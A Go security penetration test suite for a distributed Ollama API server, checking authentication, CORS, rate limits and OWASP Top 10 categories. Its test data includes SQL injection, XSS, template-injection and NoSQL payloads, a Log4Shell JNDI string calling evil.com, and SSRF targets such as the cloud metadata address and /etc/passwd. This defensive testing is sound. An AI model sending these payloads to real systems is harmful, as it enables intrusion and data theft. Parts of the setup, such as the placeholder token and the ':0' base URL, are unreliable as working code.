package security

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/khryptorgraphics/ollamamax/ollama-distributed/internal/auth"
	"github.com/khryptorgraphics/ollamamax/ollama-distributed/internal/config"
	"github.com/khryptorgraphics/ollamamax/ollama-distributed/pkg/api"
	"github.com/khryptorgraphics/ollamamax/ollama-distributed/pkg/consensus"
	"github.com/khryptorgraphics/ollamamax/ollama-distributed/pkg/p2p"
	"github.com/khryptorgraphics/ollamamax/ollama-distributed/pkg/scheduler"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// SecurityTestSuite runs comprehensive security penetration tests
type SecurityTestSuite struct {
	server    *api.Server
	baseURL   string
	client    *http.Client
	authToken string
}

// TestSecurityPenetration runs comprehensive security tests
func TestSecurityPenetration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security penetration tests in short mode")
	}

	suite := setupSecurityTestSuite(t)
	defer suite.cleanup(t)

	// Authentication & Authorization Tests
	t.Run("Authentication", func(t *testing.T) {
		suite.testAuthentication(t)
	})

	t.Run("Authorization", func(t *testing.T) {
		suite.testAuthorization(t)
	})

	// Input Validation Tests
	t.Run("InputValidation", func(t *testing.T) {
		suite.testInputValidation(t)
	})

	// Injection Attack Tests
	t.Run("InjectionAttacks", func(t *testing.T) {
		suite.testInjectionAttacks(t)
	})

	// Rate Limiting Tests
	t.Run("RateLimiting", func(t *testing.T) {
		suite.testRateLimiting(t)
	})

	// CORS Security Tests
	t.Run("CORSSecurity", func(t *testing.T) {
		suite.testCORSSecurity(t)
	})

	// TLS/SSL Tests
	t.Run("TLSSecurity", func(t *testing.T) {
		suite.testTLSSecurity(t)
	})

	// Session Management Tests
	t.Run("SessionSecurity", func(t *testing.T) {
		suite.testSessionSecurity(t)
	})

	// Information Disclosure Tests
	t.Run("InformationDisclosure", func(t *testing.T) {
		suite.testInformationDisclosure(t)
	})

	// Denial of Service Tests
	t.Run("DoSProtection", func(t *testing.T) {
		suite.testDoSProtection(t)
	})
}

// TestOWASPTop10 tests against OWASP Top 10 vulnerabilities
func TestOWASPTop10(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping OWASP Top 10 tests in short mode")
	}

	suite := setupSecurityTestSuite(t)
	defer suite.cleanup(t)

	// A01: Broken Access Control
	t.Run("A01_BrokenAccessControl", func(t *testing.T) {
		suite.testBrokenAccessControl(t)
	})

	// A02: Cryptographic Failures
	t.Run("A02_CryptographicFailures", func(t *testing.T) {
		suite.testCryptographicFailures(t)
	})

	// A03: Injection
	t.Run("A03_Injection", func(t *testing.T) {
		suite.testInjectionVulnerabilities(t)
	})

	// A04: Insecure Design
	t.Run("A04_InsecureDesign", func(t *testing.T) {
		suite.testInsecureDesign(t)
	})

	// A05: Security Misconfiguration
	t.Run("A05_SecurityMisconfiguration", func(t *testing.T) {
		suite.testSecurityMisconfiguration(t)
	})

	// A06: Vulnerable and Outdated Components
	t.Run("A06_VulnerableComponents", func(t *testing.T) {
		suite.testVulnerableComponents(t)
	})

	// A07: Identification and Authentication Failures
	t.Run("A07_AuthenticationFailures", func(t *testing.T) {
		suite.testAuthenticationFailures(t)
	})

	// A08: Software and Data Integrity Failures
	t.Run("A08_IntegrityFailures", func(t *testing.T) {
		suite.testIntegrityFailures(t)
	})

	// A09: Security Logging and Monitoring Failures
	t.Run("A09_LoggingFailures", func(t *testing.T) {
		suite.testLoggingFailures(t)
	})

	// A10: Server-Side Request Forgery (SSRF)
	t.Run("A10_SSRF", func(t *testing.T) {
		suite.testSSRF(t)
	})
}

// Setup and helper functions

func setupSecurityTestSuite(t *testing.T) *SecurityTestSuite {
	ctx := context.Background()
	
	// Create mock components
	p2pNode := createMockP2PNode(t)
	consensusEngine := createMockConsensusEngine(t)
	schedulerEngine := createMockSchedulerEngine(t)
	
	// Create API server with security configuration
	apiConfig := &config.APIConfig{
		Listen:      ":0", // Random available port
		MaxBodySize: 1024 * 1024,
		RateLimit: config.RateLimitConfig{
			RPS:    10, // Low for testing
			Burst:  20,
			Window: time.Minute,
		},
		Cors: config.CorsConfig{
			AllowedOrigins:   []string{"https://trusted.example.com"},
			AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE"},
			AllowedHeaders:   []string{"Content-Type", "Authorization"},
			AllowCredentials: true,
			MaxAge:           3600,
		},
	}
	
	server, err := api.NewServer(apiConfig, p2pNode, consensusEngine, schedulerEngine)
	require.NoError(t, err)
	
	err = server.Start()
	require.NoError(t, err)
	
	// Give server time to start
	time.Sleep(100 * time.Millisecond)
	
	// Create test client
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // For testing only
			},
		},
	}
	
	return &SecurityTestSuite{
		server:  server,
		baseURL: "http://localhost" + apiConfig.Listen,
		client:  client,
	}
}

func (s *SecurityTestSuite) cleanup(t *testing.T) {
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.server.Shutdown(ctx)
	}
}

func (s *SecurityTestSuite) createValidToken() string {
	// This would normally use the auth manager
	// For testing, we'll create a simple token
	return "valid-test-token"
}

// Authentication Tests

func (s *SecurityTestSuite) testAuthentication(t *testing.T) {
	tests := []struct {
		name           string
		token          string
		expectedStatus int
	}{
		{
			name:           "missing token",
			token:          "",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "invalid token format",
			token:          "invalid-format",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "expired token",
			token:          "Bearer expired-token",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "malformed JWT",
			token:          "Bearer malformed.jwt.token",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "valid token",
			token:          "Bearer " + s.createValidToken(),
			expectedStatus: http.StatusOK,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
			if tt.token != "" {
				req.Header.Set("Authorization", tt.token)
			}

			resp, err := s.client.Do(req)
			assert.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tt.expectedStatus, resp.StatusCode)
		})
	}
}

func (s *SecurityTestSuite) testAuthorization(t *testing.T) {
	// Test role-based access control
	endpoints := []struct {
		method   string
		path     string
		minRole  string
		payload  interface{}
	}{
		{"GET", "/api/v1/health", "user", nil},
		{"GET", "/api/v1/nodes", "admin", nil},
		{"POST", "/api/v1/cluster/join", "admin", map[string]string{"node_id": "test", "address": "test"}},
		{"DELETE", "/api/v1/models/test", "admin", nil},
	}

	for _, endpoint := range endpoints {
		t.Run(fmt.Sprintf("%s_%s", endpoint.method, endpoint.path), func(t *testing.T) {
			var body []byte
			if endpoint.payload != nil {
				body, _ = json.Marshal(endpoint.payload)
			}

			req, _ := http.NewRequest(endpoint.method, s.baseURL+endpoint.path, bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			
			// Test with insufficient privileges
			req.Header.Set("Authorization", "Bearer user-token")
			resp, err := s.client.Do(req)
			assert.NoError(t, err)
			resp.Body.Close()

			// Most endpoints should require admin access
			if endpoint.minRole == "admin" {
				assert.Equal(t, http.StatusForbidden, resp.StatusCode)
			}
		})
	}
}

// Input Validation Tests

func (s *SecurityTestSuite) testInputValidation(t *testing.T) {
	// Test various malicious payloads
	maliciousPayloads := []struct {
		name    string
		payload interface{}
		path    string
	}{
		{
			name:    "oversized JSON",
			payload: strings.Repeat("A", 2*1024*1024), // 2MB
			path:    "/api/v1/cluster/join",
		},
		{
			name: "deeply nested JSON",
			payload: createDeeplyNestedJSON(1000),
			path: "/api/v1/cluster/join",
		},
		{
			name: "special characters in node ID",
			payload: map[string]string{
				"node_id": "'; DROP TABLE nodes; --",
				"address": "127.0.0.1:8080",
			},
			path: "/api/v1/cluster/join",
		},
		{
			name: "unicode injection",
			payload: map[string]string{
				"node_id": "\u0000\u0001\u0002",
				"address": "127.0.0.1:8080",
			},
			path: "/api/v1/cluster/join",
		},
		{
			name: "XSS payload",
			payload: map[string]string{
				"node_id": "<script>alert('xss')</script>",
				"address": "127.0.0.1:8080",
			},
			path: "/api/v1/cluster/join",
		},
	}

	for _, payload := range maliciousPayloads {
		t.Run(payload.name, func(t *testing.T) {
			body, _ := json.Marshal(payload.payload)
			req, _ := http.NewRequest("POST", s.baseURL+payload.path, bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+s.createValidToken())

			resp, err := s.client.Do(req)
			assert.NoError(t, err)
			defer resp.Body.Close()

			// Should reject malicious input
			assert.True(t, resp.StatusCode >= 400, "Should reject malicious input")
		})
	}
}

// Injection Attack Tests

func (s *SecurityTestSuite) testInjectionAttacks(t *testing.T) {
	injectionPayloads := []string{
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"admin'/*",
		"${jndi:ldap://evil.com/a}",
		"{{7*7}}",
		"#{7*7}",
		"<%= 7*7 %>",
		"javascript:alert('xss')",
		"data:text/html,<script>alert('xss')</script>",
	}

	endpoints := []string{
		"/api/v1/models/{{PAYLOAD}}/download",
		"/api/v1/nodes/{{PAYLOAD}}",
	}

	for _, endpoint := range endpoints {
		for _, payload := range injectionPayloads {
			t.Run(fmt.Sprintf("injection_%s", payload), func(t *testing.T) {
				url := strings.Replace(endpoint, "{{PAYLOAD}}", payload, -1)
				
				req, _ := http.NewRequest("GET", s.baseURL+url, nil)
				req.Header.Set("Authorization", "Bearer "+s.createValidToken())

				resp, err := s.client.Do(req)
				assert.NoError(t, err)
				defer resp.Body.Close()

				// Should handle injection attempts safely
				assert.True(t, resp.StatusCode == 400 || resp.StatusCode == 404)
			})
		}
	}
}

// Rate Limiting Tests

func (s *SecurityTestSuite) testRateLimiting(t *testing.T) {
	// Burst requests to test rate limiting
	successCount := 0
	rateLimitedCount := 0

	for i := 0; i < 50; i++ {
		req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
		req.Header.Set("Authorization", "Bearer "+s.createValidToken())

		resp, err := s.client.Do(req)
		assert.NoError(t, err)
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			successCount++
		} else if resp.StatusCode == http.StatusTooManyRequests {
			rateLimitedCount++
		}

		// Small delay to avoid overwhelming
		time.Sleep(10 * time.Millisecond)
	}

	// Should eventually hit rate limits
	assert.True(t, rateLimitedCount > 0, "Should have rate limited some requests")
	assert.True(t, successCount > 0, "Should have allowed some requests")
}

// CORS Security Tests

func (s *SecurityTestSuite) testCORSSecurity(t *testing.T) {
	tests := []struct {
		name           string
		origin         string
		shouldAllow    bool
	}{
		{
			name:        "trusted origin",
			origin:      "https://trusted.example.com",
			shouldAllow: true,
		},
		{
			name:        "untrusted origin",
			origin:      "https://evil.example.com",
			shouldAllow: false,
		},
		{
			name:        "localhost origin",
			origin:      "http://localhost:3000",
			shouldAllow: false,
		},
		{
			name:        "null origin",
			origin:      "null",
			shouldAllow: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, _ := http.NewRequest("OPTIONS", s.baseURL+"/api/v1/health", nil)
			req.Header.Set("Origin", tt.origin)
			req.Header.Set("Access-Control-Request-Method", "GET")

			resp, err := s.client.Do(req)
			assert.NoError(t, err)
			defer resp.Body.Close()

			corsOrigin := resp.Header.Get("Access-Control-Allow-Origin")
			
			if tt.shouldAllow {
				assert.Equal(t, tt.origin, corsOrigin)
			} else {
				assert.NotEqual(t, tt.origin, corsOrigin)
			}
		})
	}
}

// TLS/SSL Security Tests

func (s *SecurityTestSuite) testTLSSecurity(t *testing.T) {
	// Test that sensitive endpoints require HTTPS in production
	// This is a simplified test since we're using HTTP for testing
	
	securityHeaders := []string{
		"X-Content-Type-Options",
		"X-Frame-Options",
		"X-XSS-Protection",
		"Referrer-Policy",
		"Content-Security-Policy",
	}

	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Verify security headers are present
	for _, header := range securityHeaders {
		assert.NotEmpty(t, resp.Header.Get(header), "Missing security header: %s", header)
	}
}

// Session Management Tests

func (s *SecurityTestSuite) testSessionSecurity(t *testing.T) {
	// Test session token handling
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Verify no sensitive information in response headers
	assert.Empty(t, resp.Header.Get("X-Auth-Token"))
	assert.Empty(t, resp.Header.Get("Set-Cookie"))
}

// Information Disclosure Tests

func (s *SecurityTestSuite) testInformationDisclosure(t *testing.T) {
	// Test error responses don't leak sensitive information
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/nonexistent", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	// Should not contain stack traces, internal paths, or version info
	assert.NotContains(t, bodyStr, "panic")
	assert.NotContains(t, bodyStr, "goroutine")
	assert.NotContains(t, bodyStr, "/home/")
	assert.NotContains(t, bodyStr, "/tmp/")
	assert.NotContains(t, bodyStr, "version")
}

// DoS Protection Tests

func (s *SecurityTestSuite) testDoSProtection(t *testing.T) {
	// Test request size limits
	largePayload := strings.Repeat("A", 10*1024*1024) // 10MB
	
	req, _ := http.NewRequest("POST", s.baseURL+"/api/v1/cluster/join", strings.NewReader(largePayload))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Should reject oversized requests
	assert.Equal(t, http.StatusRequestEntityTooLarge, resp.StatusCode)
}

// OWASP Top 10 Tests

func (s *SecurityTestSuite) testBrokenAccessControl(t *testing.T) {
	// Test horizontal privilege escalation
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/nodes/other-user-node", nil)
	req.Header.Set("Authorization", "Bearer user-token")

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Should deny access to other user's resources
	assert.True(t, resp.StatusCode == http.StatusForbidden || resp.StatusCode == http.StatusNotFound)
}

func (s *SecurityTestSuite) testCryptographicFailures(t *testing.T) {
	// Test that sensitive data is properly encrypted
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/metrics", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	// Should not contain plaintext secrets
	assert.NotContains(t, bodyStr, "password")
	assert.NotContains(t, bodyStr, "secret")
	assert.NotContains(t, bodyStr, "private_key")
}

func (s *SecurityTestSuite) testInjectionVulnerabilities(t *testing.T) {
	// Comprehensive injection testing
	s.testInjectionAttacks(t)
	
	// Additional NoSQL injection tests
	noSQLPayloads := []string{
		`{"$ne": null}`,
		`{"$gt": ""}`,
		`{"$where": "this.password.match(/.*/)"}`,
	}

	for _, payload := range noSQLPayloads {
		req, _ := http.NewRequest("POST", s.baseURL+"/api/v1/cluster/join", strings.NewReader(payload))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+s.createValidToken())

		resp, err := s.client.Do(req)
		assert.NoError(t, err)
		defer resp.Body.Close()

		assert.True(t, resp.StatusCode >= 400)
	}
}

func (s *SecurityTestSuite) testInsecureDesign(t *testing.T) {
	// Test for insecure design patterns
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	// Intentionally no auth header

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Health endpoint should require authentication
	assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
}

func (s *SecurityTestSuite) testSecurityMisconfiguration(t *testing.T) {
	// Test security headers and configurations
	s.testTLSSecurity(t)
	
	// Test that debug endpoints are disabled
	debugEndpoints := []string{
		"/debug/pprof/",
		"/debug/vars",
		"/_debug",
		"/admin",
	}

	for _, endpoint := range debugEndpoints {
		req, _ := http.NewRequest("GET", s.baseURL+endpoint, nil)
		resp, err := s.client.Do(req)
		assert.NoError(t, err)
		defer resp.Body.Close()

		// Debug endpoints should not be accessible
		assert.Equal(t, http.StatusNotFound, resp.StatusCode)
	}
}

func (s *SecurityTestSuite) testVulnerableComponents(t *testing.T) {
	// Test for known vulnerable patterns
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Check server header doesn't reveal version
	server := resp.Header.Get("Server")
	assert.NotContains(t, server, "nginx/")
	assert.NotContains(t, server, "Apache/")
	assert.NotContains(t, server, "Go/")
}

func (s *SecurityTestSuite) testAuthenticationFailures(t *testing.T) {
	// Test brute force protection
	for i := 0; i < 10; i++ {
		req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
		req.Header.Set("Authorization", "Bearer invalid-token")

		resp, err := s.client.Do(req)
		assert.NoError(t, err)
		resp.Body.Close()

		// Should consistently reject invalid tokens
		assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
	}
}

func (s *SecurityTestSuite) testIntegrityFailures(t *testing.T) {
	// Test request integrity
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	req.Header.Set("Authorization", "Bearer "+s.createValidToken())

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Response should have integrity indicators
	assert.Equal(t, http.StatusOK, resp.StatusCode)
}

func (s *SecurityTestSuite) testLoggingFailures(t *testing.T) {
	// Test that security events are logged
	req, _ := http.NewRequest("GET", s.baseURL+"/api/v1/health", nil)
	req.Header.Set("Authorization", "Bearer invalid-token")

	resp, err := s.client.Do(req)
	assert.NoError(t, err)
	defer resp.Body.Close()

	// Should log failed authentication attempts
	assert.Equal(t, http.StatusUnauthorized, resp.StatusCode)
}

func (s *SecurityTestSuite) testSSRF(t *testing.T) {
	// Test SSRF protection in any URL parameters
	ssrfPayloads := []string{
		"http://localhost:22",
		"http://127.0.0.1:3306",
		"http://169.254.169.254/latest/meta-data/",
		"file:///etc/passwd",
		"gopher://localhost:11211",
	}

	for _, payload := range ssrfPayloads {
		requestData := map[string]string{
			"url": payload,
		}
		
		body, _ := json.Marshal(requestData)
		req, _ := http.NewRequest("POST", s.baseURL+"/api/v1/cluster/join", bytes.NewBuffer(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer "+s.createValidToken())

		resp, err := s.client.Do(req)
		assert.NoError(t, err)
		defer resp.Body.Close()

		// Should reject SSRF attempts
		assert.True(t, resp.StatusCode >= 400)
	}
}

// Helper functions

func createDeeplyNestedJSON(depth int) map[string]interface{} {
	if depth == 0 {
		return map[string]interface{}{"value": "end"}
	}
	return map[string]interface{}{
		"nested": createDeeplyNestedJSON(depth - 1),
	}
}

func createMockP2PNode(t *testing.T) *p2p.Node {
	ctx := context.Background()
	node, err := p2p.NewP2PNode(ctx, nil)
	require.NoError(t, err)
	return node
}

func createMockConsensusEngine(t *testing.T) *consensus.Engine {
	// This would create a mock consensus engine
	// For now, return nil as the security tests focus on API layer
	return nil
}

func createMockSchedulerEngine(t *testing.T) *scheduler.Engine {
	// This would create a mock scheduler engine
	// For now, return nil as the security tests focus on API layer
	return nil
}

// Benchmark security tests

func BenchmarkSecurity_AuthenticationCheck(b *testing.B) {
	suite := setupSecurityTestSuite(&testing.T{})
	defer suite.cleanup(&testing.T{})

	token := suite.createValidToken()

	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			req, _ := http.NewRequest("GET", suite.baseURL+"/api/v1/health", nil)
			req.Header.Set("Authorization", "Bearer "+token)

			resp, err := suite.client.Do(req)
			if err != nil {
				b.Fatal(err)
			}
			resp.Body.Close()
		}
	})
}

func BenchmarkSecurity_InputValidation(b *testing.B) {
	suite := setupSecurityTestSuite(&testing.T{})
	defer suite.cleanup(&testing.T{})

	payload := map[string]string{
		"node_id": "test-node",
		"address": "127.0.0.1:8080",
	}
	body, _ := json.Marshal(payload)

	b.ResetTimer()
	b.RunParallel(func(pb *testing.PB) {
		for pb.Next() {
			req, _ := http.NewRequest("POST", suite.baseURL+"/api/v1/cluster/join", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+suite.createValidToken())

			resp, err := suite.client.Do(req)
			if err != nil {
				b.Fatal(err)
			}
			resp.Body.Close()
		}
	})
}